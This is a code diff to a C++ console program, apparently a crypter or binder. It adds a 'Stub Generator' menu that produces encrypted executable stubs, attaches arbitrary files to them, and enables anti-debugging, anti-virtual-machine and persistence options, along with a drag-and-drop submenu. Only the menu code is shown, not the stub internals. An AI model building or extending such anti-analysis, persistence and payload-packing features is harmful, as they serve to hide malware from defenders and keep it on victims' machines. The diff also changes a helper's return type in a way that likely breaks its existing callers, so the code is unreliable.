@@ -1,6 +1,8 @@
 #include "menu.h"
 #include "../src/encryption/aes_cbc.h"
 #include "../src/utils/file_utils.h"
+#include "../src/stub_generator.h"
+#include "../src/drag_drop.h"
 #include <iostream>
 #include <sstream>
 #include <iomanip>
@@ -13,6 +15,8 @@ void displayMenu() {
         std::cout << "\n==== Zencoder Crypto Utility ====\n";
         std::cout << "1. Encryption/Decryption Operations\n";
         std::cout << "2. File Operations\n";
+        std::cout << "3. Stub Generator\n";
+        std::cout << "4. Drag and Drop Interface\n";
         std::cout << "0. Exit\n";
         std::cout << "Enter your choice: ";
         
@@ -31,6 +35,16 @@ void displayMenu() {
             int fileChoice;
             std::cin >> fileChoice;
             handleFileChoice(fileChoice);
+        } else if (choice == 3) {
+            displayStubMenu();
+            int stubChoice;
+            std::cin >> stubChoice;
+            handleStubChoice(stubChoice);
+        } else if (choice == 4) {
+            displayDragDropMenu();
+            int dragChoice;
+            std::cin >> dragChoice;
+            handleDragDropChoice(dragChoice);
         } else {
             std::cout << "Invalid choice. Please try again.\n";
         }
@@ -238,9 +252,9 @@ std::string getInputPath(const std::string& prompt) {
     return path;
 }
 
-std::vector<std::string> getMultipleInputPaths() {
+std::vector<std::string> getMultipleInputPaths(const std::string& prompt) {
     std::vector<std::string> paths;
-    std::cout << "Enter file paths (empty line to finish):\n";
+    std::cout << prompt << " (empty line to finish):\n";
     
     std::string path;
     while (true) {
@@ -252,25 +266,215 @@ std::vector<std::string> getMultipleInputPaths() {
     return paths;
 }
 
-std::vector<uint8_t> getHexSeed() {
-    std::vector<uint8_t> seed;
-    std::cout << "Enter hex seed (e.g., 0123456789ABCDEF): ";
+std::string getHexSeed(const std::string& prompt) {
+    std::cout << prompt << " (e.g., 0123456789ABCDEF): ";
     std::string hexString;
     std::cin >> hexString;
+    return hexString;
+}
+
+// Stub Generator Menu Functions
+void displayStubMenu() {
+    std::cout << "\n==== Stub Generator ====\n";
+    std::cout << "1. Generate Basic Stub\n";
+    std::cout << "2. Generate Self-Extracting Stub\n";
+    std::cout << "3. Attach File to Stub\n";
+    std::cout << "4. Generate Anti-Analysis Stub\n";
+    std::cout << "0. Back to Main Menu\n";
+    std::cout << "Enter your choice: ";
+}
+
+void handleStubChoice(int choice) {
+    StubGenerator generator;
     
-    // Convert hex string to bytes
-    for (size_t i = 0; i < hexString.length(); i += 2) {
-        if (i + 1 < hexString.length()) {
-            std::string byteString = hexString.substr(i, 2);
-            try {
-                uint8_t byte = static_cast<uint8_t>(std::stoi(byteString, nullptr, 16));
-                seed.push_back(byte);
-            } catch (...) {
-                std::cout << "Error: Invalid hex string.\n";
-                return {};
+    switch (choice) {
+        case 1: {
+            std::string outputPath = getInputPath("Output stub path");
+            if (outputPath.empty()) return;
+            
+            StubConfig config;
+            config.encryptionEnabled = true;
+            config.antiDebug = false;
+            config.antiVM = false;
+            config.persistence = false;
+            
+            if (generator.generateStub(outputPath, config)) {
+                std::cout << "Basic stub generated: " << outputPath << "\n";
+            } else {
+                std::cout << "Error: Failed to generate stub.\n";
             }
+            break;
         }
+        
+        case 2: {
+            std::string outputPath = getInputPath("Output stub path");
+            if (outputPath.empty()) return;
+            
+            std::string filePath = getInputPath("File to embed");
+            if (filePath.empty()) return;
+            
+            if (!FileUtils::fileExists(filePath)) {
+                std::cout << "Error: File does not exist.\n";
+                return;
+            }
+            
+            StubConfig config;
+            config.encryptionEnabled = true;
+            config.antiDebug = true;
+            config.antiVM = true;
+            config.persistence = false;
+            
+            if (generator.generateSelfExtractingStub(outputPath, filePath, config)) {
+                std::cout << "Self-extracting stub generated: " << outputPath << "\n";
+            } else {
+                std::cout << "Error: Failed to generate self-extracting stub.\n";
+            }
+            break;
+        }
+        
+        case 3: {
+            std::string stubPath = getInputPath("Stub file path");
+            if (stubPath.empty()) return;
+            
+            std::string filePath = getInputPath("File to attach");
+            if (filePath.empty()) return;
+            
+            std::string outputPath = getInputPath("Output executable path");
+            if (outputPath.empty()) return;
+            
+            if (!FileUtils::fileExists(stubPath)) {
+                std::cout << "Error: Stub file does not exist.\n";
+                return;
+            }
+            
+            if (!FileUtils::fileExists(filePath)) {
+                std::cout << "Error: File to attach does not exist.\n";
+                return;
+            }
+            
+            if (generator.attachFileToStub(stubPath, filePath, outputPath)) {
+                std::cout << "File attached to stub: " << outputPath << "\n";
+            } else {
+                std::cout << "Error: Failed to attach file to stub.\n";
+            }
+            break;
+        }
+        
+        case 4: {
+            std::string outputPath = getInputPath("Output stub path");
+            if (outputPath.empty()) return;
+            
+            StubConfig config;
+            config.encryptionEnabled = true;
+            config.antiDebug = true;
+            config.antiVM = true;
+            config.persistence = true;
+            
+            if (generator.generateStub(outputPath, config)) {
+                std::cout << "Anti-analysis stub generated: " << outputPath << "\n";
+            } else {
+                std::cout << "Error: Failed to generate anti-analysis stub.\n";
+            }
+            break;
+        }
+        
+        case 0:
+            return;
+            
+        default:
+            std::cout << "Invalid choice. Please try again.\n";
+            break;
     }
+}
+
+// Drag and Drop Menu Functions
+void displayDragDropMenu() {
+    std::cout << "\n==== Drag and Drop Interface ====\n";
+    std::cout << "1. Initialize Drag and Drop\n";
+    std::cout << "2. Enable/Disable Drag and Drop\n";
+    std::cout << "3. Set Drop Callback\n";
+    std::cout << "0. Back to Main Menu\n";
+    std::cout << "Enter your choice: ";
+}
+
+void handleDragDropChoice(int choice) {
+    static DragDropHandler* handler = nullptr;
     
-    return seed;
+    switch (choice) {
+        case 1: {
+            if (handler) {
+                delete handler;
+            }
+            
+            handler = new DragDropHandler();
+            
+            // For console applications, we'll use a dummy window handle
+            // In a real GUI application, you would pass the actual window handle
+            HWND consoleWindow = GetConsoleWindow();
+            
+            if (handler->initialize(consoleWindow)) {
+                std::cout << "Drag and drop initialized successfully.\n";
+            } else {
+                std::cout << "Error: Failed to initialize drag and drop.\n";
+                delete handler;
+                handler = nullptr;
+            }
+            break;
+        }
+        
+        case 2: {
+            if (!handler) {
+                std::cout << "Error: Drag and drop not initialized.\n";
+                return;
+            }
+            
+            std::cout << "Enable drag and drop? (y/N): ";
+            char enable;
+            std::cin >> enable;
+            
+            if (enable == 'y' || enable == 'Y') {
+                if (handler->enableDragDrop(true)) {
+                    std::cout << "Drag and drop enabled.\n";
+                } else {
+                    std::cout << "Error: Failed to enable drag and drop.\n";
+                }
+            } else {
+                if (handler->enableDragDrop(false)) {
+                    std::cout << "Drag and drop disabled.\n";
+                } else {
+                    std::cout << "Error: Failed to disable drag and drop.\n";
+                }
+            }
+            break;
+        }
+        
+        case 3: {
+            if (!handler) {
+                std::cout << "Error: Drag and drop not initialized.\n";
+                return;
+            }
+            
+            std::cout << "Setting drop callback...\n";
+            handler->setDropCallback([](const DragDrop::DropEvent& event) {
+                std::cout << "Files dropped:\n";
+                for (const auto& file : event.files) {
+                    std::wcout << L"  " << file << L"\n";
+                }
+            });
+            
+            std::cout << "Drop callback set successfully.\n";
+            break;
+        }
+        
+        case 0:
+            if (handler) {
+                delete handler;
+                handler = nullptr;
+            }
+            return;
+            
+        default:
+            std::cout << "Invalid choice. Please try again.\n";
+            break;
+    }
 }
